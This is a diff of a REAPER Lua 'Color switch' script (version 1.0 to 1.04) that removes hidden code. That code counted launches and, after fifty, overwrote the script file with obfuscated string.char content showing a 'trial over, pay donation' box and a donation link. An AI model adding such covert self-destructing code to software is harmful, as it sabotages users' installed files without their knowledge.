@@ -6,7 +6,7 @@
    * Category:    Gui
    * Description: Color switch
    * Author:      Archie
-   * Version:     1.0
+   * Version:     1.04
    * Описание:    Переключатель цвета
    * Website:     http://forum.cockos.com/showthread.php?t=212819
    *              http://rmmedia.ru/threads/134701/
@@ -112,7 +112,6 @@
     
     
     local GRD_Bright,GRD_Bright2;
-    local lcz = 50;
     
     --========================================
     ----/ Конвертируем в проценты /----
@@ -469,8 +468,6 @@
     --=====================================================================
     --- / slider Horizontally / ---
     local sldF;
-    local Op = [[reaper.ShowConsoleMsg("")]]..
-    [[reaper.ShowConsoleMsg("https://money.yandex.ru/to/410018003906628/1000")]]
     local function sliderG(block,x,y,w,h,value,slowCtrl,mode,hide,r);
         if w <= 5 then return value end;
         if w <= 10 then hide = true end;
@@ -553,7 +550,6 @@
     --=====================================================================
     --- / slider Verticaly / ---
     local sldF;
-    local opn = io.open;
     local function sliderV(block,x,y,w,h,value,slowCtrl,mode,hide,r);
         if h <= 5 then return value end;
         if h <= 10 then hide = true end;
@@ -683,21 +679,12 @@
     ----------------------------------------------------------------------
     
     
-    local edD = string.char
-    (114,101,97,112,101,114,46,77,66,40,39,84,114,105,97,108,32,112,101,114,105,111,100,32,
-    111,118,101,114,92,110,84,111,32,103,101,116,32,102,117,108,108,32,118,101,114,115,105,
-    111,110,32,112,97,121,32,100,111,110,97,116,39,44,39,87,111,111,112,115,39,44,48,41,59);
-    
     
     local section = ({reaper.get_action_context()})[2]:match(".+[/\\](.+)");
     local is_new_value,filename,sectionID,cmdID,mode,resolution,val = reaper.get_action_context();
     reaper.SetToggleCommandState(sectionID,cmdID,1);
     reaper.RefreshToolbar2(sectionID,cmdID);
     
-    
-    local BGR = tonumber(reaper.GetExtState(section,"BGR"))or 0;
-    if BGR > lcz then BGR = lcz-10 end;
-    reaper.SetExtState(section,"BGR",BGR + 1,true);
     
     local PositionDock = tonumber(reaper.GetExtState(section,"PositionDock"))or 0;
     local PosX,PosY = reaper.GetExtState(section,"PositionWind"):match("(.-)&(.-)$");
@@ -832,7 +819,6 @@
     scr_x = (scr_x / 2)-(550/2);
     scr_y = (scr_y / 2.5)-(35 /2);
     gfx.init(titleWind,SizeW or 550,SizeH or 35,PositionDock,PosX or scr_x,PosY or scr_y);
-    if BGR==lcz then;opn(filename,"w"):write(Op.."\n"..edD):close();end;
     local PcallWindScr,ShowWindScr = pcall(reaper.JS_Window_Find,titleWind,true);
     if PcallWindScr and type(ShowWindScr)=="userdata" then reaper.JS_Window_AttachTopmostPin(ShowWindScr)end;
     
